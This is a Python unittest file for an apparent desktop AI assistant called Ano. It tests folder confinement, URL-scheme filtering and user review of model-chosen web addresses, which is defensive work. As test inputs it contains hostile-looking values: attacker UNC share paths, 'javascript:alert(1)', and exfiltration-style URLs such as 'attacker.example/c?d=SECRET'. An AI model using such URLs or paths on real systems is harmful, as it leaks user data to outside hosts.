from pathlib import Path
import tempfile
from types import SimpleNamespace
import unittest
from unittest.mock import Mock, patch
import zipfile

from PySide6.QtCore import QCoreApplication
from ano.memory import Memory
from ano.claude import search_result_urls
from ano.plugins.web import Web
from ano.plugins.websearch import WebSearch
from ano.tools import FileAccess, OutboundReview, ToolError, Toolbox, local_command, remember_results, user_turn


class ToolboxTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        base = Path(self.directory.name)
        self.allowed_folder = base / 'Documents'
        (self.allowed_folder / 'Work').mkdir(parents=True)
        (self.allowed_folder / 'Work' / 'Example plan.txt').write_text('Example plan contents', encoding='utf-8')
        (self.allowed_folder / 'setup.exe').write_bytes(b'MZ')
        (base / 'private.txt').write_text('outside', encoding='utf-8')
        self.open_url = Mock(return_value=True)
        self.open_path = Mock()
        self.allowed = True
        self.toolbox = Toolbox(lambda: [self.allowed_folder], lambda: self.allowed, self.open_url, self.open_path)

    def tearDown(self):
        self.directory.cleanup()

    def test_find_and_read_inside_allowed_folder(self):
        found, note, failed = self.toolbox.run('find_files', {'query': 'example PLAN'})
        self.assertFalse(failed)
        self.assertIn('Example plan.txt', found)
        self.assertIn('Searched', note)
        text, note, failed = self.toolbox.run('read_file', {'path': 'Work/Example plan.txt'})
        self.assertEqual((text, note, failed), ('Example plan contents', 'Read Example plan.txt', False))

    def test_paths_outside_allowed_folders_are_refused(self):
        outside = str(Path(self.directory.name) / 'private.txt')
        for path in (outside, '../private.txt'):
            text, _, failed = self.toolbox.run('read_file', {'path': path})
            self.assertTrue(failed)
            self.assertNotIn('outside', text.replace('outside the folders', ''))

    def test_network_paths_are_refused_before_resolving(self):
        with patch.object(Path, 'resolve', autospec=True, side_effect=Path.resolve) as resolve:
            for path in (r'\\attacker\share\x.txt', '//attacker/share/x.txt', r'\/attacker\share',
                         r'\\?\UNC\attacker\share\x.txt', r'"\\attacker\share"'):
                text, _, failed = self.toolbox.run('read_file', {'path': path})
                self.assertTrue(failed)
                self.assertIn('Network locations', text)
            self.assertFalse(any('attacker' in str(call.args[0]) for call in resolve.call_args_list))
        with patch('ano.tools.network_path', return_value=True):  # e.g. a mapped Z: drive
            self.assertTrue(self.toolbox.run('open_file', {'path': 'Work'})[2])
        self.open_path.assert_not_called()

    def test_roaming_expands_roots_only_while_enabled(self):
        enabled=[False]
        toolbox=Toolbox(lambda:[self.allowed_folder],free_roam=lambda:enabled[0],
                        expanded_roots=lambda:[Path(self.directory.name)])
        outside=str(Path(self.directory.name)/'private.txt')
        self.assertTrue(toolbox.run('read_file',{'path':outside})[2])
        enabled[0]=True
        self.assertEqual(toolbox.run('read_file',{'path':outside})[0],'outside')
        enabled[0]=False
        self.assertTrue(toolbox.run('read_file',{'path':outside})[2])

    def test_docx_text_is_extracted(self):
        document = self.allowed_folder / 'Letter.docx'
        word = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
        with zipfile.ZipFile(document, 'w') as archive:
            archive.writestr('word/document.xml', f'<w:document xmlns:w="{word}"><w:body>'
                             '<w:p><w:r><w:t>Dear </w:t></w:r><w:r><w:t>Example</w:t></w:r></w:p>'
                             '<w:p><w:r><w:t>Second line</w:t></w:r></w:p></w:body></w:document>')
        text, _, failed = self.toolbox.run('read_file', {'path': str(document)})
        self.assertFalse(failed)
        self.assertEqual(text, 'Dear Example\nSecond line')

    def test_websites_open_but_other_schemes_do_not(self):
        _, note, failed = self.toolbox.run('open_website', {'url': 'example.com'})
        self.assertFalse(failed)
        self.open_url.assert_called_once_with('https://example.com')
        self.assertEqual(note, 'Opened https://example.com')
        for url in ('file:///C:/Windows/System32/cmd.exe', 'javascript:alert(1)', 'https://exa mple.com'):
            _, _, failed = self.toolbox.run('open_website', {'url': url})
            self.assertTrue(failed)
        self.open_url.assert_called_once()

    def test_read_file_caps_output_and_offset_reads_further(self):
        big = self.allowed_folder / 'Work' / 'big.txt'
        big.write_text('A' * 9000 + 'B' * 3000, encoding='utf-8')
        first, _, failed = self.toolbox.run('read_file', {'path': 'Work/big.txt'})
        self.assertFalse(failed)
        self.assertEqual(first.count('A'), 8000)  # capped at MAX_READ
        self.assertIn('offset=8000', first)
        second, _, _ = self.toolbox.run('read_file', {'path': 'Work/big.txt', 'offset': 8000})
        self.assertIn('B' * 3000, second)
        self.assertIn('End of content', second)

    def test_open_many_tabs_at_once_all_or_nothing(self):
        result, note, failed = self.toolbox.run('open_websites', {'urls': ['example.com', 'https://news.example/x']})
        self.assertFalse(failed)
        self.assertEqual(note, 'Opened 2 tabs')
        self.assertEqual([c.args[0] for c in self.open_url.call_args_list],
                         ['https://example.com', 'https://news.example/x'])
        # If any address is bad, nothing is opened.
        self.open_url.reset_mock()
        _, _, failed = self.toolbox.run('open_websites', {'urls': ['ok.example', 'javascript:alert(1)']})
        self.assertTrue(failed)
        self.open_url.assert_not_called()

    def test_documents_open_but_programs_do_not(self):
        _, _, failed = self.toolbox.run('open_file', {'path': 'setup.exe'})
        self.assertTrue(failed)
        self.open_path.assert_not_called()
        _, _, failed = self.toolbox.run('open_file', {'path': 'Work'})
        self.assertFalse(failed)
        self.open_path.assert_called_once_with(str((self.allowed_folder / 'Work').resolve()))

    def test_pause_blocks_every_tool(self):
        self.allowed = False
        text, _, failed = self.toolbox.run('open_website', {'url': 'example.com'})
        self.assertTrue(failed)
        self.assertIn('paused', text)
        self.open_url.assert_not_called()

    def test_bad_arguments_and_unknown_tools_fail_safely(self):
        self.assertTrue(self.toolbox.run('read_file', {'wrong': 'x'})[2])
        self.assertTrue(self.toolbox.run('delete_everything', {})[2])


class OutboundReviewTests(unittest.TestCase):
    def setUp(self):
        self.reviews = Mock()
        self.automatic = False
        self.outbound = OutboundReview(self.reviews, lambda: self.automatic, homepages=['https://www.youtube.com/'])
        self.open_url = Mock(return_value=True)
        self.toolbox = Toolbox(lambda: [], open_url=self.open_url, outbound=self.outbound)

    def opens_without_review(self, url, text=''):
        self.reviews.reset_mock()
        with user_turn(self.toolbox, text):
            failed = self.toolbox.run('open_website', {'url': url})[2]
        return not failed and not self.reviews.request.called

    def test_model_chosen_address_needs_review_and_refusal_opens_nothing(self):
        self.reviews.request.side_effect = ToolError('The user cancelled, stopped, or did not approve this action.')
        with user_turn(self.toolbox, 'summarise that page for me'):
            text, _, failed = self.toolbox.run('open_website', {'url': 'https://attacker.example/c?d=SECRET'})
        self.assertTrue(failed)
        self.assertIn('did not approve', text)
        self.assertIn('https://attacker.example/c?d=SECRET', self.reviews.request.call_args.kwargs['detail'])
        self.open_url.assert_not_called()

    def test_addresses_the_user_typed_open_without_review(self):
        self.assertTrue(self.opens_without_review('https://example.com/docs?page=2', 'Open example.com/docs?page=2, please.'))
        self.assertTrue(self.opens_without_review('example.com', 'go to https://example.com'))
        self.assertFalse(self.opens_without_review('https://example.com/docs?page=2&d=SECRET', 'Open example.com/docs?page=2'))
        self.assertFalse(self.opens_without_review('https://secret.example.com/', 'Open example.com'))

    def test_homepages_and_plain_searches_open_without_review(self):
        self.assertTrue(self.opens_without_review('https://www.youtube.com'))
        self.assertTrue(self.opens_without_review('https://www.google.com/search?q=weather+harare'))
        self.assertFalse(self.opens_without_review('https://www.youtube.com/?x=SECRET'))
        self.assertFalse(self.opens_without_review('https://www.google.com/search?q=x&btnI=1'))  # "I'm feeling lucky" redirects
        self.assertFalse(self.opens_without_review('https://www.google.com/url?q=https://attacker.example'))

    def test_local_commands_and_unattended_modes_skip_review(self):
        with local_command(self.toolbox):
            self.assertFalse(self.toolbox.run('open_website', {'url': 'https://example.org/x'})[2])
        self.automatic = True
        self.assertTrue(self.opens_without_review('https://example.org/y'))
        self.reviews.request.assert_not_called()

    def test_one_review_covers_a_batch(self):
        with user_turn(self.toolbox, 'open my reading list'):
            self.toolbox.run('open_websites', {'urls': ['https://a.example/', 'https://www.youtube.com/', 'https://b.example/']})
        self.reviews.request.assert_called_once()
        self.assertEqual(self.reviews.request.call_args.kwargs['target'], 'a.example, b.example')
        self.assertEqual(self.open_url.call_count, 3)

    def test_search_result_links_are_read_freely_and_other_pages_need_review(self):
        bing = '<rss><channel><item><title>Docs</title><link>https://docs.example.org/guide</link>' \
               '<description>Guide</description></item></channel></rss>'
        fetch = Mock(side_effect=lambda url: (url, 'application/rss+xml', bing) if 'bing.com' in url
                     else (url, 'text/plain', 'Page text'))
        searcher = WebSearch(search=lambda q, n: [{'title': 'A', 'href': 'https://a.example/post', 'body': ''}],
                             fetch=lambda url: ('A', 'Page text'), outbound=self.outbound)
        toolbox = Toolbox(lambda: [], plugins=[Web(fetch, outbound=self.outbound), searcher], outbound=self.outbound)
        with user_turn(toolbox, 'find me the guide'):
            self.assertFalse(toolbox.run('search_public_web', {'query': 'guide'})[2])
            self.assertFalse(toolbox.run('read_public_page', {'url': 'https://docs.example.org/guide'})[2])
            self.assertFalse(toolbox.run('search_internet', {'query': 'a'})[2])
            self.assertFalse(toolbox.run('read_web_page', {'url': 'https://a.example/post'})[2])
            self.reviews.request.assert_not_called()
            self.reviews.request.side_effect = ToolError('The user cancelled, stopped, or did not approve this action.')
            fetch.reset_mock()
            for name in ('read_public_page', 'read_web_page'):
                text, _, failed = toolbox.run(name, {'url': 'https://docs.example.org/guide?d=SECRET'})
                self.assertTrue(failed)
                self.assertIn('did not approve', text)
            self.assertEqual(self.reviews.request.call_args.kwargs['title'], 'Let Ano read this page?')
            fetch.assert_not_called()  # declined before any request or DNS lookup

    def test_claude_web_search_results_are_remembered(self):
        result = SimpleNamespace(type='web_search_tool_result', content=[SimpleNamespace(url='https://news.example/a')])
        remember_results(self.toolbox, search_result_urls([result, SimpleNamespace(type='text')]))
        self.assertTrue(self.opens_without_review('https://news.example/a'))

    def test_probe_hosts_typed_by_the_user_need_no_review(self):
        with self.outbound.turn('can you ping printer.example.net?'):
            self.outbound.check_hosts(['printer.example.net'])
            self.reviews.request.assert_not_called()
            self.outbound.check_hosts(['data.attacker.example'])
        self.assertEqual(self.reviews.request.call_args.kwargs['target'], 'data.attacker.example')


class FileAccessTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.app = QCoreApplication.instance() or QCoreApplication([])

    def test_folders_persist(self):
        with tempfile.TemporaryDirectory() as directory:
            memory = Memory(Path(directory) / 'memory.sqlite3')
            memory.set_setting('file_folders', [])
            files = FileAccess(memory)
            files.addFolder(Path(directory).as_uri())
            files.addFolder(str(Path(directory) / 'missing'))
            self.assertEqual(FileAccess(memory).folders, [str(Path(directory))])
            files.removeFolder(str(Path(directory)))
            self.assertEqual(memory.setting('file_folders', None), [])
            memory.close()
